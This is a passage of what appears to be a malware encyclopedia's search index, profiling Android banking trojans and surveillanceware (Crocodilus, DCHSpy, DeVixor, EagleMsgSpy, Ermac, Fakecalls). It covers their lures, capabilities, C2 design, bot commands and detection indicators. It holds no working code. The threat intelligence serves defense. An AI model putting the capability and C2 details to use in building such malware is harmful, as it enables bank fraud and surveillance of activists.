cryptocurrency wallets globally, independent of specific banking targets. The seed phrase harvesting capability works against any cryptocurrency wallet application regardless of the victim's country.</p>"},{"location":"malware/families/crocodilus/#notable-campaigns","title":"Notable Campaigns","text":"<p>March 2025: ThreatFabric publishes the initial discovery of Crocodilus targeting Spanish and Turkish banks along with cryptocurrency wallets. The analysis highlights the proprietary dropper bypassing Android 13+ restrictions, the accessibility logger, and the contact list injection technique. ThreatFabric notes that the malware arrived fully mature rather than evolving from a simpler predecessor.</p> <p>June 2025: ThreatFabric reports rapid evolution, documenting Crocodilus's expansion to eight countries including Argentina, Brazil, India, Indonesia, and the United States. The update reveals the addition of automated cryptocurrency seed phrase harvesting and continued refinement of the core device-takeover capabilities. The pace of development and geographic expansion confirms Crocodilus as a significant emerging threat in the mobile malware landscape.</p>"},{"location":"malware/families/crocodilus/#related-families","title":"Related Families","text":"<p>Crocodilus shares the device-takeover approach with several established families. Octo pioneered remote access via screen streaming in Android banking trojans, while Hook combined VNC-style remote access with the Cerberus/Ermac lineage. Both use black screen overlays to conceal remote sessions, as does Crocodilus. However, Crocodilus is not derived from any of these families.</p> <p>The contact list injection technique is unique to Crocodilus among known Android malware families. The closest parallel is Copybara's TOAD (Telephone-Oriented Attack Delivery) approach, which also combines malware with vishing calls, though Copybara relies on the operators initiating calls rather than planting fake contacts on the device.</p> <p>For cryptocurrency targeting, Crocodilus's social-engineering-driven seed phrase capture contrasts with the OCR-based approaches used by SparkCat and SpyAgent, which scan the device's photo gallery for screenshots of seed phrases.</p>"},{"location":"malware/families/crocodilus/#evolution","title":"Evolution","text":"Version Period Changes Initial March 2025 Full device takeover, accessibility logger, contact injection, overlay attacks targeting Spain and Turkey v2 By June 2025 Automated crypto seed phrase harvesting, expanded to 8 countries, refined remote access <p>The speed of evolution from regional threat to global operation within three months is notable. Most banking trojan families take 6-12 months to achieve comparable geographic expansion. ThreatFabric attributed this to the maturity of the codebase at launch, suggesting the developers had significant prior experience.</p>"},{"location":"malware/families/crocodilus/#detection","title":"Detection","text":"Indicator Type Details Accessibility service abuse App requesting accessibility with no legitimate UX justification Contact injection Unexpected new contacts with \"Bank Support\" or similar labels appearing without user action Dropper behavior APK circumventing Android 13+ accessibility restrictions for sideloaded apps Black screen activation Device appearing locked/idle while background network activity continues Overlay windows <code>TYPE_APPLICATION_OVERLAY</code> windows rendered over banking and crypto apps Turkish debug strings Debug artifacts in Turkish language in early samples"},{"location":"malware/families/crocodilus/#references","title":"References","text":"<ul> <li>ThreatFabric - Exposing Crocodilus: New Device Takeover Malware (March 2025)</li> <li>ThreatFabric - Crocodilus Mobile Malware Evolving Fast, Going Global (June 2025)</li> </ul>"},{"location":"malware/families/dchspy/","title":"DCHSpy","text":"<p>DCHSpy is an Iranian Android surveillanceware operated by MuddyWater, an espionage group linked to Iran's Ministry of Intelligence and Security (MOIS). Lookout discovered DCHSpy in July 2025, identifying 11 samples dating back to 2021. The malware is distributed through fake VPN apps (Earth VPN, Comodo VPN, Hide VPN) and StarLink connectivity lures, exploiting Iranian internet outages to convince targets to sideload trojanized utilities. DCHSpy collects WhatsApp data, contacts, SMS, files, location, and call logs while also recording audio and capturing photos. All exfiltrated data is transmitted via encrypted SFTP channels. Activity surged in the wake of Israeli strikes on Iranian nuclear infrastructure, with four new samples appearing within a single week, confirming its role as a reactive intelligence collection tool deployed during periods of geopolitical escalation.</p>"},{"location":"malware/families/dchspy/#overview","title":"Overview","text":"Attribute Details First Seen 2021 (earliest samples) Status Active, with surge in 2025 Type Surveillanceware, espionage Aliases None known Attribution MuddyWater (MOIS, Iran) Distribution Fake VPN apps, StarLink lures"},{"location":"malware/families/dchspy/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Lookout's July 2025 analysis traced DCHSpy samples back to 2021, establishing a four-year operational history before public disclosure. The malware is attributed to MuddyWater, an Iranian state-sponsored group that operates under the authority of Iran's Ministry of Intelligence and Security. MuddyWater has historically focused on desktop-based espionage campaigns targeting government entities, telecommunications companies, and defense organizations across the Middle East. DCHSpy represents the group's Android surveillance capability, extending their collection into mobile devices carried by targets of interest.</p> <p>The sustained development over four years with only 11 total samples indicates a highly targeted deployment model rather than mass distribution. This low sample volume is consistent with state-sponsored surveillance operations where each implant is delivered to a specific individual rather than cast broadly.</p>"},{"location":"malware/families/dchspy/#distribution","title":"Distribution","text":"Vector Details Earth VPN Fake VPN application impersonating a legitimate VPN service Comodo VPN Fake VPN application using the Comodo brand Hide VPN Fake VPN application promising anonymous browsing StarLink lures Fake satellite internet connectivity app exploiting Iranian internet outages <p>DCHSpy's distribution strategy is tightly coupled to the Iranian domestic environment. Iran periodically restricts or shuts down internet access during protests, elections, and military escalations. During these outages, demand for VPN tools and alternative connectivity solutions surges as citizens and activists attempt to circumvent censorship. MuddyWater exploits this demand by distributing trojanized VPN apps and StarLink connectivity lures through channels likely including messaging platforms, social media, and direct delivery to targets.</p> <p>The VPN lure pattern is particularly effective because targets already expect VPN apps to request broad device permissions (network access, background operation, storage). The StarLink lures appeared during periods when satellite internet was seen as a viable alternative to state-controlled infrastructure, making them credible to technically aware targets.</p>"},{"location":"malware/families/dchspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/dchspy/#core-features","title":"Core Features","text":"Capability Implementation WhatsApp data theft Exfiltrates WhatsApp databases and media files Contact exfiltration Harvests the full contact list from the device SMS collection Reads and exfiltrates all text messages File theft Accesses and uploads files from device storage Location tracking Collects GPS coordinates and location data Call log harvesting Extracts call history with numbers, timestamps, and durations Audio recording Records ambient audio via the device microphone Photo capture Takes photos using device cameras"},{"location":"malware/families/dchspy/#surveillance-focus","title":"Surveillance Focus","text":"<p>DCHSpy's capability set is optimized for intelligence collection against individuals rather than financial theft. The combination of WhatsApp data extraction, contact harvesting, and ambient audio recording provides operators with comprehensive visibility into a target's communications network, physical movements, and private conversations. WhatsApp is the dominant messaging platform in Iran and across the Middle East, making its data a high-priority collection target for understanding both personal and organizational communications.</p>"},{"location":"malware/families/dchspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/dchspy/#sftp-exfiltration","title":"SFTP Exfiltration","text":"<p>DCHSpy exfiltrates all collected data via encrypted SFTP (SSH File Transfer Protocol) rather than the HTTP-based channels used by most Android malware families. SFTP provides built-in encryption for data in transit, eliminating the need for a separate encryption layer within the malware itself. This choice also makes exfiltration traffic harder to distinguish from legitimate file transfer activity on the network.</p>"},{"location":"malware/families/dchspy/#low-volume-high-value-deployment","title":"Low-Volume, High-Value Deployment","text":"<p>Lookout identified only 11 total samples across the entire four-year operational period, reinforcing the assessment that each deployment is carefully targeted. The appearance of four new samples within a single week following Israeli strikes on Iranian nuclear infrastructure demonstrates that MuddyWater can rapidly scale collection activity in response to geopolitical events, likely deploying to additional targets during periods when intelligence demand increases.</p>"},{"location":"malware/families/dchspy/#target-regions","title":"Target Regions","text":"Region Details Iran (domestic) Primary target: dissidents, activists, journalists within Iran Middle East (broader) Secondary targeting aligned with MOIS intelligence priorities <p>DCHSpy targets Iranian dissidents, activists, and journalists, groups that MuddyWater and MOIS consider threats to the Iranian state. The VPN and StarLink lures are specifically designed for an Iranian audience navigating government-imposed internet restrictions. The targeting of domestic populations for surveillance aligns with MOIS's dual foreign and domestic intelligence mandate.</p>"},{"location":"malware/families/dchspy/#notable-campaigns","title":"Notable Campaigns","text":"<p>2021 to 2025: Lookout documented 11 samples spanning four years, distributed through fake VPN applications and StarLink lures. The sustained, low-volume campaign is consistent with targeted intelligence collection against specific individuals rather than broad-spectrum deployment.</p> <p>2025 (post-Israeli strikes): Four new DCHSpy samples appeared within a single week following Israeli strikes on Iranian nuclear infrastructure. This surge in activity demonstrates the malware's use as a reactive intelligence tool, with MuddyWater deploying additional implants during a period of heightened geopolitical tension when monitoring dissidents and activists becomes a higher priority for the Iranian state.</p>"},{"location":"malware/families/dchspy/#related-families","title":"Related Families","text":"Family Relationship AridSpy Both are state-sponsored Android surveillanceware targeting Middle Eastern populations. AridSpy (Arid Viper) uses trojanized messaging apps with a multistage architecture, while DCHSpy uses fake VPN lures with SFTP exfiltration. Both prioritize WhatsApp data and contact harvesting. GuardZoo Both are state-aligned Android surveillance tools operating in Middle Eastern conflict contexts. GuardZoo (Houthi-aligned) targets military personnel for GPS and mapping data, while DCHSpy targets civilian dissidents and activists for communications intelligence. PJobRAT Both distribute fake utility apps for espionage targeting specific regional populations. PJobRAT targeted Indian military personnel and later Taiwanese users with fake chat apps, while DCHSpy targets Iranian dissidents with fake VPN apps. Both prioritize messaging data extraction."},{"location":"malware/families/dchspy/#references","title":"References","text":""},{"location":"malware/families/devixor/","title":"DeVixor","text":"<p>DeVixor is an Iranian Android banking RAT with ransomware capability discovered by Cyble in late 2025. With over 700 samples identified, DeVixor has evolved from a simple SMS harvester into a full-featured remote access trojan capable of banking fraud, credential theft, and file encryption with ransom demands payable via TRON cryptocurrency wallets. The malware uses Firebase for command-and-control communication and Telegram bots for administrative functions, allowing the developer to manage infections and receive alerts through Telegram channels. Distribution relies on phishing sites that impersonate Iranian automotive businesses. The developer openly operates a Telegram channel where version updates are published, demonstrating the brazen operational security posture common among Iranian cybercriminals who face minimal domestic law enforcement risk when targeting local victims.</p>"},{"location":"malware/families/devixor/#overview","title":"Overview","text":"Attribute Details First Seen Pre-2025 (evolved from earlier SMS harvester) Status Active, under continued development Type Banking RAT, ransomware, credential stealer Aliases None known Attribution Iranian developer (individual) Distribution Phishing sites impersonating Iranian automotive businesses"},{"location":"malware/families/devixor/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Cyble's analysis documented DeVixor's evolution from a basic SMS harvesting tool into a comprehensive banking RAT. The earliest versions focused solely on intercepting SMS messages, a capability commonly used to capture one-time passwords for Iranian banking services. Over successive versions, the developer added banking overlay attacks, credential theft, remote access functionality, and ultimately a ransomware module.</p> <p>The developer maintains a public Telegram channel where new versions are announced and feature updates are published. This open development model is characteristic of Iranian Android malware authors who operate with relative impunity within Iran's cybercrime ecosystem, particularly when their tools target domestic victims. The Telegram channel serves as both a marketing platform for potential buyers and a distribution point for updates.</p> <p>The identification of over 700 samples indicates prolific distribution or widespread adoption by multiple operators. This volume is significantly higher than targeted surveillance tools (which typically produce fewer than 50 samples) and aligns with financially motivated campaigns that prioritize scale.</p>"},{"location":"malware/families/devixor/#distribution","title":"Distribution","text":"Vector Details Automotive phishing sites Fake websites impersonating Iranian car manufacturers and dealerships Social engineering Victims directed to download apps from phishing sites via messaging platforms <p>The automotive industry lure is specifically tailored to the Iranian market. Car purchases in Iran frequently involve complex installment plans, registration processes, and government subsidy applications, all of which can be plausibly digitized into a mobile app. Victims downloading what they believe is an automotive services app are unlikely to question permission requests for SMS access, storage, and accessibility services, as these could be reasonably expected for a transaction management application.</p>"},{"location":"malware/families/devixor/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/devixor/#core-features","title":"Core Features","text":"Capability Implementation Banking overlay attacks Displays fake login screens over Iranian banking applications Credential theft Captures banking credentials, passwords, and authentication tokens SMS interception Reads and exfiltrates SMS messages, capturing OTPs and 2FA codes Remote access Full device control via RAT functionality Ransomware Encrypts device files and demands ransom via TRON cryptocurrency wallet Contact exfiltration Harvests the victim's contact list Call log harvesting Extracts call history Screen capture Takes screenshots of the device display"},{"location":"malware/families/devixor/#banking-fraud","title":"Banking Fraud","text":"<p>DeVixor targets Iranian banking applications with overlay attacks that display fake login screens when the victim opens a banking app. The overlays capture credentials, which are then used for unauthorized account access. Combined with SMS interception for OTP capture, the malware provides operators with everything needed to perform fraudulent transactions on the victim's banking accounts.</p>"},{"location":"malware/families/devixor/#ransomware-module","title":"Ransomware Module","text":"<p>The ransomware capability encrypts files on the device and presents a ransom demand payable to a TRON blockchain wallet address. TRON is a popular cryptocurrency choice for Iranian threat actors because it offers low transaction fees and is accessible through exchanges that do not enforce strict KYC (Know Your Customer) requirements. The combination of banking fraud and ransomware in a single tool allows operators to monetize infections through multiple channels: stealing funds directly from bank accounts and extorting the victim for file recovery.</p>"},{"location":"malware/families/devixor/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/devixor/#firebase-c2","title":"Firebase C2","text":"<p>DeVixor uses Google Firebase for command-and-control communication. Firebase provides a reliable, high-availability infrastructure that blends with legitimate Android app traffic. Commands are delivered to infected devices through Firebase messaging, and configuration updates can be pushed in real time without requiring the malware to poll a traditional C2 server.</p>"},{"location":"malware/families/devixor/#telegram-bot-administration","title":"Telegram Bot Administration","text":"<p>Operators manage DeVixor infections through Telegram bots. The bots provide real-time notifications when new devices are infected, allow operators to issue commands to specific devices, and relay exfiltrated data. This architecture eliminates the need for a dedicated C2 panel, leveraging Telegram's existing infrastructure for operational management.</p> Infrastructure Purpose Firebase C2 communication, command delivery, configuration updates Telegram bots Administrative interface, infection notifications, data relay TRON wallet Ransomware payment collection"},{"location":"malware/families/devixor/#evolution-timeline","title":"Evolution Timeline","text":"Phase Capabilities Early versions SMS harvesting only Mid-development Added banking overlays and credential theft Current version Full RAT with banking fraud, credential theft, remote access, and ransomware"},{"location":"malware/families/devixor/#target-regions","title":"Target Regions","text":"Region Details Iran Exclusive target: Iranian banking users and device owners <p>DeVixor targets Iranian users exclusively. The phishing sites impersonating automotive businesses, the banking overlay targets focusing on Iranian financial institutions, and the developer's public Telegram channel all confirm a purely domestic targeting scope. This exclusive focus on Iranian victims is consistent with the broader ecosystem of Iranian Android malware, where developers operate openly within Iran while targeting local users for financial gain.</p>"},{"location":"malware/families/devixor/#notable-campaigns","title":"Notable Campaigns","text":"<p>Pre-2025 (evolution period): DeVixor evolves from a basic SMS harvester through successive development iterations, adding banking overlays, credential theft, and remote access capabilities. The developer publishes updates through a Telegram channel, building out the tool's feature set incrementally.</p> <p>Late 2025: Cyble publishes their analysis documenting DeVixor as a fully evolved banking RAT with ransomware capability. The research identifies over 700 samples, Firebase-based C2 infrastructure, Telegram bot administration, and distribution through automotive phishing sites. The ransomware module demanding TRON cryptocurrency payments is highlighted as a notable feature combining banking fraud and extortion in a single tool.</p>"},{"location":"malware/families/devixor/#related-families","title":"Related Families","text":"Family Relationship Rafel RAT Both combine RAT functionality with ransomware capability on Android, a relatively uncommon pairing. Rafel RAT is open-source with global targeting across 120+ campaigns, while DeVixor is a closed-source tool targeting Iranian users exclusively. Both use cryptocurrency for ransom payments. Fakecalls Both are regional banking trojans focused on a single domestic market. Fakecalls targets South Korean banking users with voice call interception, while DeVixor targets Iranian banking users with overlay attacks and ransomware. Both demonstrate how banking trojans are adapted to specific national financial ecosystems."},{"location":"malware/families/devixor/#references","title":"References","text":""},{"location":"malware/families/eaglemsgspy/","title":"EagleMsgSpy","text":"<p>EagleMsgSpy is a lawful intercept surveillance tool developed by Wuhan Chinasoft Token Information Technology Co., Ltd. and deployed by public security bureaus across mainland China. Lookout disclosed the family in December 2024, identifying samples dating back to at least 2017. The tool operates as a two-component system: an installer APK (operated by a law enforcement officer with physical access to the unlocked target device) drops a headless surveillance module that persists in the background and exfiltrates collected data to C2 infrastructure. EagleMsgSpy harvests SMS, call logs, contacts, GPS coordinates, browser bookmarks, network activity, and messages from third-party chat applications including QQ, Telegram, Viber, WhatsApp, and WeChat. It also performs screen recording, screenshot capture, and audio recording. The C2 backend features an admin panel branded \"Stability Maintenance Judgment System\" (\u7ef4\u7a33\u7814\u5224\u7cfb\u7edf), and source code references to iOS handling functions suggest a corresponding iOS variant exists, though none has been identified to date.</p>"},{"location":"malware/families/eaglemsgspy/#quick-reference","title":"Quick Reference","text":"Attribute Details First Seen 2017 (earliest known samples) Last Seen Active as of late 2024 Status Active, under continued development Type Lawful intercept surveillanceware Attribution Wuhan Chinasoft Token Information Technology Co., Ltd. (developer); Chinese public security bureaus (operators) Distribution Physical access to unlocked device required; installer APK not found on Google Play or app stores"},{"location":"malware/families/eaglemsgspy/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/eaglemsgspy/#data-collection","title":"Data Collection","text":"Capability Details SMS harvesting Collects all SMS messages from the device Call logs Extracts full call history Contacts Exfiltrates device contact list GPS location Tracks device coordinates Browser bookmarks Harvests saved bookmarks and browsing data Network activity Monitors network connections and Wi-Fi information Third-party chat interception Captures messages from QQ, Telegram, Viber, WhatsApp, and WeChat Screen recording Records the device screen in real time Screenshot capture Takes screenshots on demand or automatically Audio recording Records ambient audio via microphone"},{"location":"malware/families/eaglemsgspy/#admin-panel","title":"Admin Panel","text":"<p>The C2 servers host an administrative panel called the \"Stability Maintenance Judgment System\" (\u7ef4\u7a33\u7814\u5224\u7cfb\u7edf), built with AngularJS. Authenticated operators can trigger real-time photo collection, initiate audio recordings, capture screenshots, block incoming calls and messages, view geographical heatmaps and distribution of a target's contacts, and retrieve the top 10 most frequently contacted individuals. The panel's source code contains functions like <code>getListIOS()</code> that distinguish between Android and iOS platforms, implying an iOS variant exists even though Lookout has not located one.</p>"},{"location":"malware/families/eaglemsgspy/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/eaglemsgspy/#two-component-architecture","title":"Two-Component Architecture","text":"<p>EagleMsgSpy uses a split installer-payload design:</p> Component Role Installer APK Operated by the individual with physical device access; deploys and configures the surveillance payload Surveillance module (headless) Runs without any visible UI; collects data, communicates with C2 <p>The installer is never distributed through app stores. Physical access to the unlocked device is the only known delivery method, consistent with a lawful intercept tool designed for use during police operations.</p>"},{"location":"malware/families/eaglemsgspy/#c2-communication","title":"C2 Communication","text":"<p>The surveillance module communicates with C2 servers using WebSockets over the STOMP messaging protocol to provide status updates and receive further instructions. Collected data is stored in a hidden directory on the device filesystem, then compressed, password-protected, and exfiltrated to C2 infrastructure. The string <code>tzsafe</code> appears in all known versions of the surveillance module as part of the encryption password, and the domain <code>tzsafe[.]com</code> was found in promotional materials linked to Wuhan Chinasoft Token.</p>"},{"location":"malware/families/eaglemsgspy/#obfuscation","title":"Obfuscation","text":"<p>Early variants of EagleMsgSpy employed minimal obfuscation. More recent samples use ApkToolPlus, an open-source application protection tool, to conceal portions of the code.</p>"},{"location":"malware/families/eaglemsgspy/#infrastructure-connections","title":"Infrastructure Connections","text":"<p>Two IP addresses tied to EagleMsgSpy C2 SSL certificates overlap with infrastructure used by other China-linked surveillance tools:</p> IP Address Connection 202.107.80[.]34 Used by 15 PluginPhantom samples from early 2017 to late 2020 119.36.193[.]210 Contacted by a CarbonSteal sample <p>Both PluginPhantom and CarbonSteal have been used to target Tibetan and Uyghur communities, placing EagleMsgSpy's infrastructure within a broader Chinese state surveillance ecosystem.</p>"},{"location":"malware/families/eaglemsgspy/#distribution","title":"Distribution","text":"<p>EagleMsgSpy requires physical access to the target's unlocked device. This is not a remotely deployed exploit, it is a tool designed for installation during physical custody of the device (arrests, border crossings, device inspections). Neither the installer nor the surveillance payload has been observed on Google Play or third-party app stores.</p>"},{"location":"malware/families/eaglemsgspy/#attribution","title":"Attribution","text":"<p>Lookout attributes EagleMsgSpy to Wuhan Chinasoft Token Information Technology Co., Ltd. with high confidence, based on:</p> <ul> <li>C2 server IP addresses previously pointed to by subdomains associated with the company</li> <li>The <code>tzsafe</code> string in the surveillance module matching the company's promotional domain</li> <li>Artifacts found in open C2 directories</li> <li>Source code references and OSINT investigation</li> </ul> <p>The company develops the tool; Chinese public security bureaus are the operational users.</p>"},{"location":"malware/families/eaglemsgspy/#references","title":"References","text":"<ul> <li>Lookout: EagleMsgSpy Chinese Android Surveillanceware</li> <li>The Hacker News: Chinese EagleMsgSpy Spyware Found Exploiting Mobile Devices Since 2017</li> <li>BleepingComputer: New EagleMsgSpy Android spyware used by Chinese police</li> <li>SecurityWeek: Mobile Surveillance Tool EagleMsgSpy Used by Chinese Law Enforcement</li> <li>The Record: Chinese provincial security teams used spyware to collect texts, audio recordings</li> <li>Security Affairs: China uses EagleMsgSpy surveillance tool</li> </ul>"},{"location":"malware/families/ermac/","title":"Ermac","text":"<p>Ermac is the Cerberus fork that proved a leaked source code could be refined into a competitive commercial product. Operated by the threat actor \"DukeEugene\" and sold as MaaS starting in late 2021, Ermac took the leaked Cerberus codebase, rewrote the encryption layer, updated the obfuscation, and expanded target coverage to over 460 banking and cryptocurrency applications. It served as DukeEugene's primary revenue stream until Hook replaced it in early 2023.</p>"},{"location":"malware/families/ermac/#overview","title":"Overview","text":"Attribute Details First Seen August 2021 Last Seen Late 2022 (superseded by Hook) Status Succeeded by Hook; Ermac 3.0 source leaked August 2025 Type Banking trojan (MaaS) Attribution \"DukeEugene\" (previously linked to BlackRock) Aliases Ermac 1.0, Ermac 2.0, HookBot (sometimes conflated) Source Built on leaked Cerberus source; Ermac 3.0 source leaked in 2025 Rental Price $3,000/month (v1.0), $5,000/month (v2.0)"},{"location":"malware/families/ermac/#origin-and-lineage","title":"Origin and Lineage","text":"<p>ThreatFabric identified Ermac in September 2021, calling it \"another Cerberus reborn.\" Code analysis confirmed that Ermac is a direct descendant of the leaked Cerberus source: it uses nearly identical data structures for C2 communication and retains the same overall architecture. The modifications focus on encryption, obfuscation, and expanded targeting rather than fundamental redesign.</p> <p>DukeEugene was already known as the operator behind BlackRock, another Android banking trojan discovered in 2020. ThreatFabric noted the cessation of fresh BlackRock samples coinciding with Ermac's emergence, indicating DukeEugene transitioned wholesale from BlackRock to Ermac. The actor advertised Ermac on the same underground forums where Cerberus had previously been sold, positioning it as a superior replacement.</p> <p>Ermac sits in the middle of the Cerberus lineage: downstream of the original source leak, upstream of Hook. When DukeEugene launched Hook in January 2023, NCC Group confirmed that Hook was built directly on Ermac's codebase, with all 30 Ermac bot commands present in Hook alongside 38 new additions.</p>"},{"location":"malware/families/ermac/#distribution","title":"Distribution","text":"<p>Ermac operators used multiple delivery channels, with a strong preference for phishing sites impersonating legitimate applications.</p> Vector Details Fake app websites Typosquatted domains mimicking legitimate services. Cyble documented a campaign using a fake Bolt Food delivery site targeting Polish users. Phishing pages Browser-based landing pages distributed via malvertising and social media posts Smishing SMS messages containing links to the fake app download pages Third-party stores APKs uploaded to unofficial Android app repositories Malvertising Paid ads redirecting to phishing domains <p>Ermac 2.0 distribution was particularly active against Polish users, with campaigns impersonating Bolt Food, banking apps, and browser updates. The fake sites were often near-identical to the originals, differing by only a single character in the domain name.</p>"},{"location":"malware/families/ermac/#capabilities","title":"Capabilities","text":""},{"location":"malware/families/ermac/#ermac-10-august-2021","title":"Ermac 1.0 (August 2021)","text":"<p>Ermac 1.0 targeted 378 applications and rented for $3,000/month.</p> Capability Implementation Overlay attacks WebView-based injects triggered by accessibility service foreground detection SMS interception Read and redirect incoming SMS for OTP capture Contact harvesting Exfiltrate device contacts to C2 App listing Enumerate installed packages to determine overlay targets Account theft Steal accounts stored on the device via <code>AccountManager</code> Push notifications Display notifications to lure user into opening target apps App cache clearing Clear app data to force re-authentication, then capture fresh credentials via overlay Open URL Launch arbitrary URLs in the device browser"},{"location":"malware/families/ermac/#ermac-20-may-2022","title":"Ermac 2.0 (May 2022)","text":"<p>Ermac 2.0 expanded to 467 target applications and increased the rental price to $5,000/month. Cyble's analysis and Intel 471's deep dive documented the upgraded version.</p> Capability Implementation Expanded overlays 467 banking and cryptocurrency app targets (up from 378) Cryptocurrency wallet targeting Injects for major wallets including MetaMask, Trust Wallet, Coinbase 43 permissions Self-grants extensive permissions via accessibility on installation Improved obfuscation Updated string encryption and code obfuscation Broader geo-targeting Expanded from Eastern European focus to global coverage <p>Ermac 2.0 was the third most active Android banking trojan during Q2 2022.</p>"},{"location":"malware/families/ermac/#limitations-compared-to-successors","title":"Limitations Compared to Successors","text":"<p>Ermac notably lacked several features that would later appear in Hook:</p> Missing Feature Added In VNC/screen streaming Hook RAT with UI interaction Hook File manager Hook ATS (Automated Transfer System) Hook WhatsApp message extraction Hook WebSocket communication Hook"},{"location":"malware/families/ermac/#technical-details","title":"Technical Details","text":""},{"location":"malware/families/ermac/#encryption","title":"Encryption","text":"<p>The most significant technical departure from Cerberus is the encryption scheme. Where Cerberus used a straightforward encryption approach for C2 communication, ThreatFabric noted that Ermac introduced:</p> <ul> <li>String encryption: Uses the Blowfish algorithm to encrypt hardcoded strings, resolved at runtime</li> <li>C2 communication: Data encrypted with AES-128-CBC, prepended with a double word containing the length of the encoded data (different from Cerberus's original scheme)</li> </ul>"},{"location":"malware/families/ermac/#c2-protocol","title":"C2 Protocol","text":"<p>Ermac communicates with its C2 server over HTTP. The protocol follows Cerberus's general pattern but with the updated encryption layer:</p> <ol> <li>Bot registers with C2, sending encrypted device fingerprint (IMEI, model, installed apps, SIM info)</li> <li>C2 responds with configuration: target app list, inject URLs, command queue</li> <li>Bot polls C2 at regular intervals for new commands</li> <li>Credential data from overlays is encrypted and POSTed back to C2</li> </ol> <p>Key bot commands:</p> Command Action <code>getSMS</code> Retrieve SMS messages from device <code>sentSMS</code> Send SMS from victim device <code>startApp</code> Launch specified application (triggers overlay) <code>getAccounts</code> Steal device accounts <code>getContacts</code> Exfiltrate contact list <code>getInstalledApps</code> Enumerate installed packages <code>push</code> Display push notification <code>clearCache</code> Clear target app data to force re-login <code>openURL</code> Open URL in browser"},{"location":"malware/families/ermac/#obfuscation","title":"Obfuscation","text":"<p>Ermac applies multiple obfuscation layers on top of the Cerberus base:</p> Technique Details Blowfish string encryption All sensitive strings encrypted, decrypted at runtime Class/method renaming Standard ProGuard-style obfuscation Packed payloads Some samples use additional packing layers Dynamic C2 resolution C2 addresses encrypted and resolved at runtime"},{"location":"malware/families/ermac/#accessibility-service","title":"Accessibility Service","text":"<p>Like its Cerberus ancestor, Ermac's entire operation hinges on the Android Accessibility Service. The malware uses a persistent screen urging the user to enable accessibility until they comply. Once enabled, the service:</p> <ul> <li>Monitors foreground application changes via <code>TYPE_WINDOW_STATE_CHANGED</code></li> <li>Auto-grants runtime permissions without user interaction</li> <li>Captures keystrokes across all applications</li> <li>Triggers overlays when target apps are detected</li> <li>Prevents uninstallation by intercepting settings navigation</li> </ul>"},{"location":"malware/families/ermac/#target-regions-and-financial-institutions","title":"Target Regions and Financial Institutions","text":"<p>Ermac's target list grew substantially between versions, with heavy concentration in European and North American banking:</p> Region Notable Targets Poland Primary initial target; campaigns impersonating Bolt Food, PKO Bank United States Major banks and financial apps Western Europe Spain, France, Italy, Germany, UK Eastern Europe Turkey, Czech Republic Australia Major banking institutions Cryptocurrency (global) MetaMask, Trust Wallet, Coinbase, Crypto.com, Binance <p>Cryptocurrency wallets became a significant focus in Ermac 2.0. The inject kits included dedicated phishing screens for seed phrase capture across major wallet applications, reflecting the broader trend of Android banking trojans expanding into crypto theft.</p>"},{"location":"malware/families/ermac/#notable-campaigns","title":"Notable Campaigns","text":"<p>August 2021: First Ermac campaigns identified by ThreatFabric targeting Poland with 378 banking app overlays. DukeEugene advertised rentals at $3,000/month.</p> <p>May 2022: Ermac 2.0 launched. Cyble documented campaigns using fake Bolt Food sites to deliver the updated trojan to Polish users. Target list expanded to 467 applications. Bleeping Computer reported the expanded targeting and $5,000/month rental price.</p> <p>Q2-Q3 2022: Intel 471 reported Ermac as the third most active Android banking trojan, with campaigns spanning multiple continents. Cyble tracked increasingly active distribution across Europe.</p> <p>January 2023: DukeEugene announced Hook, built on Ermac's codebase. Active Ermac campaigns began declining as operators migrated to the more capable successor.</p> <p>2024: Silent Push uncovered 24 active DukeEugene control panels administering services for Ermac, Hook, and related variants, demonstrating that Ermac infrastructure remained partially operational even after Hook's introduction.</p> <p>August 2025: The Ermac 3.0 source code leaked, exposing the full malware infrastructure including C2 panel code and builder tools, mirroring the original Cerberus leak that started the lineage.</p>"},{"location":"malware/families/ermac/#references","title":"References","text":""},{"location":"malware/families/fakecalls/","title":"Fakecalls","text":"<p>Fakecalls is a Korean banking trojan with voice phishing (vishing) capabilities that intercepts outgoing calls to real bank phone numbers and replaces them with attacker-controlled recorded conversations. Kaspersky published a detailed analysis documenting the call interception mechanism. McAfee later documented variants signed with a legitimate Android app signing key, enabling the malware to bypass signature-based detection and app verification checks. The family targets major South Korean banks exclusively and represents the most advanced integration of voice phishing with mobile malware.</p>"},{"location":"malware/families/fakecalls/#overview","title":"Overview","text":"Attribute Details First Seen 2022 Last Seen Active Status Active, ongoing Korean campaigns Type Banking trojan with vishing capability Attribution Unknown; Korean-language operations Aliases None known"},{"location":"malware/families/fakecalls/#vendor-names","title":"Vendor Names","text":"Vendor Name Kaspersky HEUR:Trojan-Banker.AndroidOS.Fakecalls McAfee Android/Fakecalls AhnLab Trojan/Android.FakeCalls ESET Android/Spy.Banker.Fakecalls"},{"location":"malware/families/fakecalls/#origin-and-lineage","title":"Origin and Lineage","text":"<p>Fakecalls is independently developed with no known code lineage to other banking trojan families. Its primary innovation is the integration of voice call interception with mobile banking fraud, a capability not seen in other documented families. While Copybara uses human operators making real vishing calls (TOAD), Fakecalls automates the voice phishing by intercepting actual calls to banks and playing pre-recorded IVR (Interactive Voice Response) audio.</p>"},{"location":"malware/families/fakecalls/#distribution","title":"Distribution","text":"Vector Details Fake banking apps APKs impersonating KB Kookmin Bank, Shinhan Bank, Samsung Card, Hana Bank Third-party stores Korean third-party app repositories Smishing SMS lures directing users to fake banking app download pages <p>The fake apps closely replicate the look of legitimate Korean banking applications, using official logos, color schemes, and interface layouts.</p>"},{"location":"malware/families/fakecalls/#capabilities","title":"Capabilities","text":"Capability Description Call interception Intercepts outgoing calls to real bank numbers, replaces with recorded audio Call spoofing Displays the real bank's phone number on screen while the call is redirected Recorded IVR playback Plays pre-recorded Korean-language IVR menus mimicking bank customer service Live operator handoff Can connect victim to a live attacker posing as bank staff Overlay attacks Credential phishing overlays over banking apps SMS interception Reads and intercepts OTP codes Screen streaming Real-time screen capture sent to C2 Device info collection IMEI, phone number, installed apps, contacts GPS location Tracks victim location"},{"location":"malware/families/fakecalls/#call-interception-flow","title":"Call Interception Flow","text":"<p>The voice phishing attack chain:</p> <ol> <li>User dials their real bank's customer service 